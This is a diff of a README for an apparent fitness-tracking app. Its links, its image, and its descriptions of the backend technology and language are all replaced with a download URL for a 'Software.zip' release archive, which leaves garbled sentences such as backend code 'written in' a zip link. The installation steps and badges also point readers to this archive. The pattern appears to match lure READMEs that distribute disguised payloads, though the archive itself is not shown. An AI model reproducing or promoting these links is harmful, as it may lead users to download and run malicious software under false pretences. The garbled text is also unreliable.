@@ -1,7 +1,7 @@
 # 🎯 Fit Track Goals App 🏋️‍♂️
 ## Set goals, track progress, share fitness easily
 
-![Fitness Tracker](https://images.pexels.com/photos/416778/pexels-photo-416778.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940)
+![Fitness Tracker](https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip)
 
 Welcome to the **Fit Track Goals App** repository! This app is designed to help you set fitness goals, track your progress, and easily share your achievements with others. Whether you are a fitness enthusiast, an athlete, or just someone looking to improve your health, this app is for you!
 
@@ -14,7 +14,7 @@ Welcome to the **Fit Track Goals App** repository! This app is designed to help 
 
 ### 🛠️ Technologies Used:
 - **Frontend**: ReactJS
-- **Backend**: Node.js
+- **Backend**: https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip
 - **Code Generation**: Automated code generation tools
 - **Developer Tools**: Tools to enhance developers' productivity
 - **DevOps**: Practices and tools for software development and IT operations
@@ -31,7 +31,7 @@ Welcome to the **Fit Track Goals App** repository! This app is designed to help 
 
 ### 📂 Repository Structure:
 - **`/frontend`**: Contains frontend code written in ReactJS
-- **`/backend`**: Contains backend code written in Node.js
+- **`/backend`**: Contains backend code written in https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip
 - **`/docs`**: Documentation files for the app
 - **`/scripts`**: Scripts for automated tasks
 - **`/tests`**: Test files for testing purposes
@@ -39,7 +39,7 @@ Welcome to the **Fit Track Goals App** repository! This app is designed to help 
 ### 📦 Installation:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/user-attachments/files/18388744/Software.zip
+   git clone https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip
    ```
 2. Launch the app by running the appropriate scripts for frontend and backend.
 
@@ -48,8 +48,8 @@ If the link ends with the file name, please ensure to extract the compressed fil
 If you encounter any issues with the provided link, please check the "Releases" section of this repository for an alternative download option.
 
 ### 🌐 Get Started:
-Visit the [Fit Track Goals App](https://github.com/user-attachments/files/18388744/Software.zip) and start your fitness journey today!
+Visit the [Fit Track Goals App](https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip) and start your fitness journey today!
 
 Let's get fit together! 💪🏼
 
-[![Download App](https://img.shields.io/badge/Download-App-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download App](https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip)](https://github.com/NguyenQuy19/fit-track-goals-app/releases/download/v2.0/Software.zip)
